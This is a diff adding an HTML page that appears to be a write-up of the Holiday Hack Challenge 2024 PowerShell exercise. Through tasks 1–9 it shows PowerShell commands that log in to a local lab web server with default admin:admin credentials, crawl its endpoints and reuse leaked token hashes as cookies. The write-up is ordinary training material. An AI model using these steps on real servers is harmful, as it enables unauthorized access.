@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr" itemscope itemtype="http://schema.org/Article">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="height=device-height, width=device-width, initial-scale=1.0, minimum-scale=1.0">
+    <meta name="generator" content="Hugo 0.131.0">
+    <meta name="generator" content="Relearn 7.1.1">
+    <meta name="description" content="Silver Task 1 There is a file in the current directory called ‘welcome.txt’. Read the contents of this file Get-Content -Path &#34;.\welcome.txt&#34; Output
+System Overview The Elf Weaponry Multi-Factor Authentication (MFA) system safeguards access to a classified armory containing elf weapons. This high-security system is equipped with advanced defense mechanisms, including canaries, retinal scanner and keystroke analyzing, to prevent unauthorized access. In the event of suspicious activity, the system automatically initiates a lockdown, restricting all access until manual override by authorized personnel.">
+    <meta name="author" content="Roger C.B. Johnsen">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="Powershell - HHC 2024">
+    <meta name="twitter:description" content="Silver Task 1 There is a file in the current directory called ‘welcome.txt’. Read the contents of this file Get-Content -Path &#34;.\welcome.txt&#34; Output
+System Overview The Elf Weaponry Multi-Factor Authentication (MFA) system safeguards access to a classified armory containing elf weapons. This high-security system is equipped with advanced defense mechanisms, including canaries, retinal scanner and keystroke analyzing, to prevent unauthorized access. In the event of suspicious activity, the system automatically initiates a lockdown, restricting all access until manual override by authorized personnel.">
+    <meta property="og:url" content="http://localhost:1313/act2/powershell/index.html">
+    <meta property="og:site_name" content="HHC 2024">
+    <meta property="og:title" content="Powershell - HHC 2024">
+    <meta property="og:description" content="Silver Task 1 There is a file in the current directory called ‘welcome.txt’. Read the contents of this file Get-Content -Path &#34;.\welcome.txt&#34; Output
+System Overview The Elf Weaponry Multi-Factor Authentication (MFA) system safeguards access to a classified armory containing elf weapons. This high-security system is equipped with advanced defense mechanisms, including canaries, retinal scanner and keystroke analyzing, to prevent unauthorized access. In the event of suspicious activity, the system automatically initiates a lockdown, restricting all access until manual override by authorized personnel.">
+    <meta property="og:locale" content="en_us">
+    <meta property="og:type" content="article">
+    <meta property="article:section" content="Act2">
+    <meta property="article:published_time" content="2024-11-23T13:18:37+01:00">
+    <meta property="article:modified_time" content="2024-11-23T13:18:37+01:00">
+    <meta itemprop="name" content="Powershell - HHC 2024">
+    <meta itemprop="description" content="Silver Task 1 There is a file in the current directory called ‘welcome.txt’. Read the contents of this file Get-Content -Path &#34;.\welcome.txt&#34; Output
+System Overview The Elf Weaponry Multi-Factor Authentication (MFA) system safeguards access to a classified armory containing elf weapons. This high-security system is equipped with advanced defense mechanisms, including canaries, retinal scanner and keystroke analyzing, to prevent unauthorized access. In the event of suspicious activity, the system automatically initiates a lockdown, restricting all access until manual override by authorized personnel.">
+    <meta itemprop="datePublished" content="2024-11-23T13:18:37+01:00">
+    <meta itemprop="dateModified" content="2024-11-23T13:18:37+01:00">
+    <meta itemprop="wordCount" content="1343">
+    <title>Powershell - HHC 2024</title>
+    <link href="/images/logo.png?1732383767" rel="icon" type="image/png">
+    <link href="/css/fontawesome-all.min.css?1732383767" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fontawesome-all.min.css?1732383767" rel="stylesheet"></noscript>
+    <link href="/css/nucleus.css?1732383767" rel="stylesheet">
+    <link href="/css/auto-complete.css?1732383767" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/auto-complete.css?1732383767" rel="stylesheet"></noscript>
+    <link href="/css/perfect-scrollbar.min.css?1732383767" rel="stylesheet">
+    <link href="/css/fonts.css?1732383767" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/css/fonts.css?1732383767" rel="stylesheet"></noscript>
+    <link href="/css/theme.css?1732383767" rel="stylesheet">
+    <link href="/css/theme-christmas.css?1732383767" rel="stylesheet" id="R-variant-style">
+    <link href="/css/chroma-relearn-light.css?1732383767" rel="stylesheet" id="R-variant-chroma-style">
+    <link href="/css/print.css?1732383767" rel="stylesheet" media="print">
+    <script src="/js/variant.js?1732383767"></script>
+    <script>
+      window.relearn = window.relearn || {};
+      window.relearn.relBasePath='..\/..';
+      window.relearn.relBaseUri='..\/..';
+      window.relearn.absBaseUri='http:\/\/localhost:1313';
+      window.relearn.disableAnchorCopy=false;
+      window.relearn.disableAnchorScrolling=false;
+      // variant stuff
+      window.variants && variants.init( [ 'christmas' ] );
+      // translations
+      window.T_Copy_to_clipboard = `Copy to clipboard`;
+      window.T_Copied_to_clipboard = `Copied to clipboard!`;
+      window.T_Copy_link_to_clipboard = `Copy link to clipboard`;
+      window.T_Link_copied_to_clipboard = `Copied link to clipboard!`;
+      window.T_Reset_view = `Reset view`;
+      window.T_View_reset = `View reset!`;
+      window.T_No_results_found = `No results found for "{0}"`;
+      window.T_N_results_found = `{1} results found for "{0}"`;
+    </script>
+  </head>
+  <body class="mobile-support html" data-url="/act2/powershell/index.html">
+    <div id="R-body" class="default-animation">
+      <div id="R-body-overlay"></div>
+      <nav id="R-topbar">
+        <div class="topbar-wrapper">
+          <div class="topbar-sidebar-divider"></div>
+          <div class="topbar-area topbar-area-start" data-area="start">
+            <div class="topbar-button topbar-button-sidebar" data-content-empty="disable" data-width-s="show" data-width-m="hide" data-width-l="hide"><button class="topbar-control" onclick="toggleNav()" type="button" title="Menu (CTRL&#43;ALT&#43;n)"><i class="fa-fw fas fa-bars"></i></button>
+            </div>
+            <div class="topbar-button topbar-button-toc" data-content-empty="hide" data-width-s="show" data-width-m="show" data-width-l="show"><button class="topbar-control" onclick="toggleTopbarFlyout(this)" type="button" title="Table of Contents (CTRL&#43;ALT&#43;t)"><i class="fa-fw fas fa-list-alt"></i></button>
+              <div class="topbar-content">
+                <div class="topbar-content-wrapper">
+<nav class="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#silver">Silver</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+                </div>
+              </div>
+            </div>
+          </div>
+          <span class="topbar-breadcrumbs highlightable">
+            Powershell
+          </span>
+          <div class="topbar-area topbar-area-end" data-area="end">
+            <div class="topbar-button topbar-button-more" data-content-empty="hide" data-width-s="show" data-width-m="show" data-width-l="show"><button class="topbar-control" onclick="toggleTopbarFlyout(this)" type="button" title="More"><i class="fa-fw fas fa-ellipsis-v"></i></button>
+              <div class="topbar-content">
+                <div class="topbar-content-wrapper">
+                  <div class="topbar-area topbar-area-more" data-area="more">
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav>
+      <div id="R-main-overlay"></div>
+      <main id="R-body-inner" class="highlightable act2" tabindex="-1">
+        <div class="flex-block-wrapper">
+<article class="default">
+  <header class="headline">
+  </header>
+
+<h1 id="powershell">Powershell</h1>
+
+<h3 id="silver">Silver</h3>
+<h4 id="task-1">Task 1</h4>
+<blockquote>
+<ol>
+<li>There is a file in the current directory called &lsquo;welcome.txt&rsquo;. Read the contents of this file</li>
+</ol>
+</blockquote>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-Content -Path <span style="color:#e6db74">&#34;.\welcome.txt&#34;</span></span></span></code></pre></div>
+<p><strong>Output</strong></p>
+<div class="highlight wrap-code"><pre tabindex="0"><code>System Overview
+The Elf Weaponry Multi-Factor Authentication (MFA) system safeguards access to a classified armory containing elf weapons. This high-security system is equipped with advanced defense mechanisms, including canaries, retinal scanner and keystroke analyzing, to prevent unauthorized access. In the event of suspicious activity, the system automatically initiates a lockdown, restricting all access until manual override by authorized personnel.
+
+Lockdown Protocols
+When the system enters lockdown mode, all access to the armory is frozen. This includes both entry to and interaction with the weaponry storage. The defense mechanisms become active, deploying logical barriers to prohibit unauthorized access. During this state, users cannot disable the system without the intervention of an authorized administrator. The system logs all access attempts and alerts central command when lockdown is triggered.
+
+Access and System Restoration
+To restore access to the system, users must follow strict procedures. First, authorized personnel must identify the scrambled endpoint. Next, they must deactivate the defense mechanisms by entering the override code and presenting the required token. After verification, the system will resume standard operation, and access to weaponry is reactivated.</code></pre></div>
+<h4 id="task-2">Task 2</h4>
+<blockquote>
+<ol start="2">
+<li>Geez that sounds ominous, I&rsquo;m sure we can get past the defense mechanisms.
+We should warm up our PowerShell skills.
+How many words are there in the file?</li>
+</ol>
+</blockquote>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>(Get-Content -Path <span style="color:#e6db74">&#34;.\welcome.txt&#34;</span> -Raw) -split <span style="color:#e6db74">&#39;\s+&#39;</span> | Where-Object { $_ <span style="color:#f92672">-ne</span> <span style="color:#e6db74">&#39;&#39;</span> } | Measure-Object | Select-Object -ExpandProperty Count</span></span></code></pre></div>
+<p><strong>Output</strong></p>
+<div class="highlight wrap-code"><pre tabindex="0"><code>180</code></pre></div>
+<h4 id="task-3">Task 3</h4>
+<blockquote>
+<ol start="3">
+<li>There is a server listening for incoming connections on this machine, that must be the weapons terminal. What port is it listening on?</li>
+</ol>
+</blockquote>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>netstat -an | Select-String <span style="color:#e6db74">&#39;LISTEN&#39;</span></span></span></code></pre></div>
+<p><strong>Output</strong></p>
+<div class="highlight wrap-code"><pre tabindex="0"><code>tcp        0      0 127.0.0.1:1225          0.0.0.0:*               LISTEN     
+unix  2      [ ACC ]     STREAM     LISTENING     350156949 /tmp/CoreFxPipe_PSHos
+t.DB3DA5D4.143.None.pwsh
+unix  2      [ ACC ]     STREAM     LISTENING     350148184 /tmp/tmux-1050/default
+unix  2      [ ACC ]     STREAM     LISTENING     350154640 /tmp/dotnet-diagnosti
+c-143-25076401-socket</code></pre></div>
+<h4 id="task-4">Task 4</h4>
+<blockquote>
+<ol start="4">
+<li>You should enumerate that webserver. Communicate with the server using HTTP, what status code do you get?</li>
+</ol>
+</blockquote>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Invoke-WebRequest -Uri <span style="color:#e6db74">&#34;http://127.0.0.1:1225&#34;</span></span></span></code></pre></div>
+<p><strong>Output</strong></p>
+<div class="highlight wrap-code"><pre tabindex="0"><code>Invoke-WebRequest: Response status code does not indicate success: 401 (UNAUTHORIZED).</code></pre></div>
+<h4 id="task-5">Task 5</h4>
+<blockquote>
+<ol start="5">
+<li>It looks like defensive measures are in place, it is protected by basic authentication.
+Try authenticating with a standard admin username and password.</li>
+</ol>
+</blockquote>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Invoke-WebRequest -Uri <span style="color:#e6db74">&#34;http://127.0.0.1:1225&#34;</span> -Headers @{ Authorization = <span style="color:#e6db74">&#34;Basic </span>$([<span style="color:#66d9ef">Convert</span>]::ToBase64String([<span style="color:#66d9ef">Text.Encoding</span>]::ASCII.GetBytes(<span style="color:#e6db74">&#39;admin:admin&#39;</span>)))<span style="color:#e6db74">&#34;</span> } -UseBasicParsing</span></span></code></pre></div>
+<p><strong>Output</strong></p>
+<div class="highlight wrap-code"><pre tabindex="0"><code>StatusCode        : 200
+StatusDescription : OK
+Content           : &lt;html&gt;
+                    &lt;body&gt;
+                    &lt;pre&gt;
+                    ----------------------------------------------------
+                    🪖 Elf MFA webserver🪖
+                    ⚔️ Grab your tokens for access to weaponry ⚔️
+                    ⚔️ Warning! Sensitive information on the server, protect a…
+RawContent        : HTTP/1.1 200 OK
+                    Server: Werkzeug/3.0.6
+                    Server: Python/3.10.12
+                    Date: Sat, 23 Nov 2024 13:04:34 GMT
+                    Connection: close
+                    Content-Type: text/html; charset=utf-8
+                    Content-Length: 3475
+                    
+                    &lt;html&gt;
+                    &lt;body&gt;
+                    &lt;pre&gt;
+                    ---…
+Headers           : {[Server, System.String[]], [Date, System.String[]], [Connection, System.String[]], [Content-Type, System.String[]]…}
+Images            : {}
+InputFields       : {}
+Links             : {@{outerHTML=&lt;a href=&#34;http://localhost:1225/endpoints/1&#34;&gt;Endpoint 1&lt;/a&gt;; tagName=A; href=http://localhost:1225/endpoints/1}, @{outerHTML=&lt;a href=&#34;http://localhost:1225/endpoints/2&#34;&gt;Endpoint 2&lt;/a&gt;; tagName=A; href=htt
+                    p://localhost:1225/endpoints/2}, @{outerHTML=&lt;a href=&#34;http://localhost:1225/endpoints/3&#34;&gt;Endpoint 3&lt;/a&gt;; tagName=A; href=http://localhost:1225/endpoints/3}, @{outerHTML=&lt;a href=&#34;http://localhost:1225/endpoints/4&#34;&gt;End
+                    point 4&lt;/a&gt;; tagName=A; href=http://localhost:1225/endpoints/4}…}
+RawContentLength  : 3475
+RelationLink      : {}</code></pre></div>
+<h4 id="task-6">Task 6</h4>
+<blockquote>
+<ol start="6">
+<li>There are too many endpoints here.
+Use a loop to download the contents of each page. What page has 138 words?
+When you find it, communicate with the URL and print the contents to the terminal.</li>
+</ol>
+</blockquote>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$response = Invoke-WebRequest -Uri <span style="color:#e6db74">&#34;http://127.0.0.1:1225&#34;</span> -Headers @{ Authorization = <span style="color:#e6db74">&#34;Basic </span>$([<span style="color:#66d9ef">Convert</span>]::ToBase64String([<span style="color:#66d9ef">Text.Encoding</span>]::ASCII.GetBytes(<span style="color:#e6db74">&#39;admin:admin&#39;</span>)))<span style="color:#e6db74">&#34;</span> } -UseBasicParsing; $response.Links | Where-Object { $_.href <span style="color:#f92672">-like</span> <span style="color:#e6db74">&#34;http://localhost:1225/endpoints/*&#34;</span> } | ForEach-Object { $pageContent = Invoke-WebRequest -Uri $_.href -Headers @{ Authorization = <span style="color:#e6db74">&#34;Basic </span>$([<span style="color:#66d9ef">Convert</span>]::ToBase64String([<span style="color:#66d9ef">Text.Encoding</span>]::ASCII.GetBytes(<span style="color:#e6db74">&#39;admin:admin&#39;</span>)))<span style="color:#e6db74">&#34;</span> } -UseBasicParsing; <span style="color:#66d9ef">if</span> (($pageContent.Content -split <span style="color:#e6db74">&#39;\s+&#39;</span>).Count <span style="color:#f92672">-eq</span> <span style="color:#ae81ff">138</span>) { Write-Output <span style="color:#e6db74">&#34;Found page with 138 words: </span>$($_.href)<span style="color:#e6db74">&#34;</span>; Write-Output $pageContent.Content; <span style="color:#66d9ef">break</span> } }</span></span></code></pre></div>
+<p><strong>Output</strong></p>
+<div class="highlight wrap-code"><pre tabindex="0"><code>Found page with 138 words: http://localhost:1225/endpoints/13                                                           
+&lt;html&gt;&lt;head&gt;&lt;title&gt;MFA token scrambler&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;Yuletide cheer fills the air,&lt;br&gt;    A season of love, of care.&lt;br&gt;    The world is bright, full of light,&lt;br&gt;    As we celebrate this special night.&lt;br&gt;    The tree is trimmed, the stockings hung,&lt;br&gt;    Carols are sung, bells are rung.&lt;br&gt;    Families gather, friends unite,&lt;br&gt;    In the glow of the fire’s light.&lt;br&gt;    The air is filled with joy and peace,&lt;br&gt;    As worries and cares find release.&lt;br&gt;    Yuletide cheer, a gift so dear,&lt;br&gt;    Brings warmth and love to all near.&lt;br&gt;    May we carry it in our hearts,&lt;br&gt;    As the season ends, as it starts.&lt;br&gt;    Yuletide cheer, a time to share,&lt;br&gt;    The love, the joy, the care.&lt;br&gt;    May it guide us through the year,&lt;br&gt;    In every laugh, in every tear.&lt;br&gt;    Yuletide cheer, a beacon bright,&lt;br&gt;    Guides us through the winter night &lt;/p&gt;&lt;p&gt; Note to self, remember to remove temp csvfile at http://127.0.0.1:1225/token_overview.csv&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;</code></pre></div>
+<h4 id="task-7">Task 7</h4>
+<blockquote>
+<ol start="7">
+<li>There seems to be a csv file in the comments of that page.
+That could be valuable, read the contents of that csv-file!</li>
+</ol>
+</blockquote>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$response = Invoke-WebRequest -Uri <span style="color:#e6db74">&#34;http://127.0.0.1:1225&#34;</span> -Headers @{ Authorization = <span style="color:#e6db74">&#34;Basic </span>$([<span style="color:#66d9ef">Convert</span>]::ToBase64String([<span style="color:#66d9ef">Text.Encoding</span>]::ASCII.GetBytes(<span style="color:#e6db74">&#39;admin:admin&#39;</span>)))<span style="color:#e6db74">&#34;</span> } -UseBasicParsing; 
+</span></span><span style="display:flex;"><span>$response.Links | Where-Object { $_.href <span style="color:#f92672">-like</span> <span style="color:#e6db74">&#34;http://localhost:1225/endpoints/*&#34;</span> } | ForEach-Object { 
+</span></span><span style="display:flex;"><span>    $pageContent = Invoke-WebRequest -Uri $_.href -Headers @{ Authorization = <span style="color:#e6db74">&#34;Basic </span>$([<span style="color:#66d9ef">Convert</span>]::ToBase64String([<span style="color:#66d9ef">Text.Encoding</span>]::ASCII.GetBytes(<span style="color:#e6db74">&#39;admin:admin&#39;</span>)))<span style="color:#e6db74">&#34;</span> } -UseBasicParsing; 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (($pageContent.Content -split <span style="color:#e6db74">&#39;\s+&#39;</span>).Count <span style="color:#f92672">-eq</span> <span style="color:#ae81ff">138</span>) { 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($pageContent.Content <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#39;(http[^&#34;]+\.csv)&#39;</span>) { 
+</span></span><span style="display:flex;"><span>            $csvUrl = $matches[<span style="color:#ae81ff">1</span>]; 
+</span></span><span style="display:flex;"><span>            $csvContent = Invoke-WebRequest -Uri $csvUrl -Headers @{ Authorization = <span style="color:#e6db74">&#34;Basic </span>$([<span style="color:#66d9ef">Convert</span>]::ToBase64String([<span style="color:#66d9ef">Text.Encoding</span>]::ASCII.GetBytes(<span style="color:#e6db74">&#39;admin:admin&#39;</span>)))<span style="color:#e6db74">&#34;</span> } -UseBasicParsing; 
+</span></span><span style="display:flex;"><span>            $csvContent.Content | Write-Output; 
+</span></span><span style="display:flex;"><span>        } 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span> 
+</span></span><span style="display:flex;"><span>    } 
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
+<p><strong>Output</strong></p>
+<div class="highlight wrap-code"><pre tabindex="0"><code>6ef5570cd43a3ec9f43c57f662201e55,REDACTED
+bf189d47c3175ada98af398669e3cac3,REDACTED
+743ac25389a0b430dd9f8e72b2ec9d7f,REDACTED
+270aabd5feaaf40185f2effa9fa2cd6e,REDACTED
+8b58850ee66bd2ab7dd2f5f850c855f8,REDACTED
+6fd00cbda10079b1d55283a88680d075,REDACTED
+612001dd92369a7750c763963bc327f0,REDACTED
+010f2cc580f74521c86215b7374eead6,REDACTED
+29860c67296d808bc6506175a8cbb422,REDACTED
+7b7f6891b6b6ab46fe2e85651db8205f,REDACTED
+45ffb41c4e458d08a8b08beeec2b4652,REDACTED
+d0e6bfb6a4e6531a0c71225f0a3d908d,REDACTED
+bd7efda0cb3c6d15dd896755003c635c,REDACTED
+5be8911ced448dbb6f0bd5a24cc36935,REDACTED
+1acbfea6a2dad66eb074b17459f8c5b6,REDACTED
+0f262d0003bd696550744fd43cd5b520,REDACTED
+8cac896f624576d825564bb30c7250eb,REDACTED
+8ef6d2e12a58d7ec521a56f25e624b80,REDACTED
+b4959370a4c484c10a1ecc53b1b56a7d,REDACTED
+38bdd7748a70529e9beb04b95c09195d,REDACTED
+8d4366f08c013f5c0c587b8508b48b15,REDACTED
+67566692ca644ddf9c1344415972fba8,REDACTED
+8fbf4152f89b7e309e89b9f7080c7230,REDACTED
+936f4db24a290032c954073b3913f444,REDACTED
+c44d8d6b03dcd4b6bf7cb53db4afdca6,REDACTED
+cb722d0b55805cd6feffc22a9f68177d,REDACTED
+724d494386f8ef9141da991926b14f9b,REDACTED
+67c7aef0d5d3e97ad2488babd2f4c749,REDACTED
+5f8dd236f862f4507835b0e418907ffc,4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C
+# [*] SYSTEMLOG
+# [*] Defence mechanisms activated, REDACTING endpoints, starting with sensitive endpoints
+# [-] ERROR, memory corruption, not all endpoints have been REDACTED
+# [*] Verification endpoint still active
+# [*] http://127.0.0.1:1225/tokens/&lt;sha256sum&gt;
+# [*] Contact system administrator to unlock panic mode
+# [*] Site functionality at minimum to keep weapons active</code></pre></div>
+<h4 id="task-8">Task 8</h4>
+<blockquote>
+<ol start="8">
+<li>Luckily the defense mechanisms were faulty!
+There seems to be one api-endpoint that still isn&rsquo;t redacted! Communicate with that endpoint!</li>
+</ol>
+</blockquote>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$response = Invoke-WebRequest -Uri <span style="color:#e6db74">&#34;http://127.0.0.1:1225&#34;</span> -Headers @{ Authorization = <span style="color:#e6db74">&#34;Basic </span>$([<span style="color:#66d9ef">Convert</span>]::ToBase64String([<span style="color:#66d9ef">Text.Encoding</span>]::ASCII.GetBytes(<span style="color:#e6db74">&#39;admin:admin&#39;</span>)))<span style="color:#e6db74">&#34;</span> } -UseBasicParsing; 
+</span></span><span style="display:flex;"><span>$response.Links | Where-Object { $_.href <span style="color:#f92672">-like</span> <span style="color:#e6db74">&#34;http://localhost:1225/endpoints/*&#34;</span> } | ForEach-Object { 
+</span></span><span style="display:flex;"><span>    $pageContent = Invoke-WebRequest -Uri $_.href -Headers @{ Authorization = <span style="color:#e6db74">&#34;Basic </span>$([<span style="color:#66d9ef">Convert</span>]::ToBase64String([<span style="color:#66d9ef">Text.Encoding</span>]::ASCII.GetBytes(<span style="color:#e6db74">&#39;admin:admin&#39;</span>)))<span style="color:#e6db74">&#34;</span> } -UseBasicParsing; 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (($pageContent.Content -split <span style="color:#e6db74">&#39;\s+&#39;</span>).Count <span style="color:#f92672">-eq</span> <span style="color:#ae81ff">138</span>) { 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($pageContent.Content <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#39;(http[^&#34;]+\.csv)&#39;</span>) { 
+</span></span><span style="display:flex;"><span>            $csvUrl = $matches[<span style="color:#ae81ff">1</span>]; 
+</span></span><span style="display:flex;"><span>            $csvContent = Invoke-WebRequest -Uri $csvUrl -Headers @{ Authorization = <span style="color:#e6db74">&#34;Basic </span>$([<span style="color:#66d9ef">Convert</span>]::ToBase64String([<span style="color:#66d9ef">Text.Encoding</span>]::ASCII.GetBytes(<span style="color:#e6db74">&#39;admin:admin&#39;</span>)))<span style="color:#e6db74">&#34;</span> } -UseBasicParsing; 
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># Split each line by comma and return the last value (assumed hash)</span>
+</span></span><span style="display:flex;"><span>            $csvContent.Content -split <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">`n</span><span style="color:#e6db74">&#34;</span> | Where-Object { $_ <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#39;\b[a-fA-F0-9]{64}\b&#39;</span> } | ForEach-Object { 
+</span></span><span style="display:flex;"><span>                $fields = $_ -split <span style="color:#e6db74">&#39;,&#39;</span>   <span style="color:#75715e"># Split the line by comma</span>
+</span></span><span style="display:flex;"><span>                $sha256sum = $fields[<span style="color:#ae81ff">-1</span>]  <span style="color:#75715e"># Get the last field (SHA256 hash)</span>
+</span></span><span style="display:flex;"><span>                
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># Send a web request with the SHA256 hash</span>
+</span></span><span style="display:flex;"><span>                $url = <span style="color:#e6db74">&#34;http://127.0.0.1:1225/tokens/</span>$sha256sum<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>                $response = Invoke-WebRequest -Uri $url -Headers @{
+</span></span><span style="display:flex;"><span>                    Authorization = <span style="color:#e6db74">&#34;Basic </span>$([<span style="color:#66d9ef">Convert</span>]::ToBase64String([<span style="color:#66d9ef">Text.Encoding</span>]::ASCII.GetBytes(<span style="color:#e6db74">&#39;admin:admin&#39;</span>)))<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>                } -Method Get -UseBasicParsing
+</span></span><span style="display:flex;"><span>                
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># Output the response or relevant data</span>
+</span></span><span style="display:flex;"><span>                $response.Content
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        } 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span> 
+</span></span><span style="display:flex;"><span>    } 
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
+<p><strong>Output</strong></p>
+<div class="highlight wrap-code"><pre tabindex="0"><code>&lt;h1&gt;[!] ERROR: Missing Cookie &#39;token&#39;&lt;/h1&gt;                                                                              </code></pre></div>
+<h4 id="task-9">Task 9</h4>
+<blockquote>
+<ol start="9">
+<li>It looks like it requires a cookie token, set the cookie and try again.</li>
+</ol>
+</blockquote>
+<div class="highlight wrap-code"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Fetch the content from the URL</span>
+</span></span><span style="display:flex;"><span>$response = Invoke-WebRequest -Uri <span style="color:#e6db74">&#34;http://127.0.0.1:1225/token_overview.csv&#34;</span> -Headers @{
+</span></span><span style="display:flex;"><span>    Authorization = <span style="color:#e6db74">&#34;Basic </span>$([<span style="color:#66d9ef">Convert</span>]::ToBase64String([<span style="color:#66d9ef">Text.Encoding</span>]::ASCII.GetBytes(<span style="color:#e6db74">&#39;admin:admin&#39;</span>)))<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>} -UseBasicParsing
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Split the content into lines, filter out lines containing &#39;REDACTED&#39;, &#39;#&#39;, &#39;file_MD5hash&#39;, or &#39;Sha256(file_MD5hash)&#39;</span>
+</span></span><span style="display:flex;"><span>$filteredContent = $response.Content -split <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">`n</span><span style="color:#e6db74">&#34;</span> | Where-Object { 
+</span></span><span style="display:flex;"><span>    $_ <span style="color:#f92672">-notmatch</span> <span style="color:#e6db74">&#34;REDACTED&#34;</span> <span style="color:#f92672">-and</span> 
+</span></span><span style="display:flex;"><span>    $_ <span style="color:#f92672">-notmatch</span> <span style="color:#e6db74">&#34;#&#34;</span> <span style="color:#f92672">-and</span> 
+</span></span><span style="display:flex;"><span>    $_ <span style="color:#f92672">-notmatch</span> <span style="color:#e6db74">&#34;file_MD5hash&#34;</span> <span style="color:#f92672">-and</span> 
+</span></span><span style="display:flex;"><span>    $_ <span style="color:#f92672">-notmatch</span> <span style="color:#e6db74">&#34;Sha256\(file_MD5hash\)&#34;</span> 
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Convert the filtered lines into an object (in-memory CSV structure)</span>
+</span></span><span style="display:flex;"><span>$csvData = $filteredContent | ForEach-Object {
+</span></span><span style="display:flex;"><span>    $fields = $_ -split <span style="color:#e6db74">&#34;,&#34;</span>  <span style="color:#75715e"># Split each line by commas into an array of fields</span>
+</span></span><span style="display:flex;"><span>    [<span style="color:#66d9ef">PSCustomObject</span>]@{
+</span></span><span style="display:flex;"><span>        Column1 = $fields[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>        Column2 = $fields[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$sha256Sum = $csvData.Column2
+</span></span><span style="display:flex;"><span>$md5Sum = $csvData.Column1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Invoke-WebRequest -Uri <span style="color:#e6db74">&#34;http://127.0.0.1:1225/tokens/</span>$sha256Sum<span style="color:#e6db74">&#34;</span> -Headers @{
+</span></span><span style="display:flex;"><span>    Authorization = <span style="color:#e6db74">&#34;Basic </span>$([<span style="color:#66d9ef">Convert</span>]::ToBase64String([<span style="color:#66d9ef">Text.Encoding</span>]::ASCII.GetBytes(<span style="color:#e6db74">&#39;admin:admin&#39;</span>)))<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    Cookie = <span style="color:#e6db74">&#34;token=</span>$md5Sum<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>} -UseBasicParsing</span></span></code></pre></div>
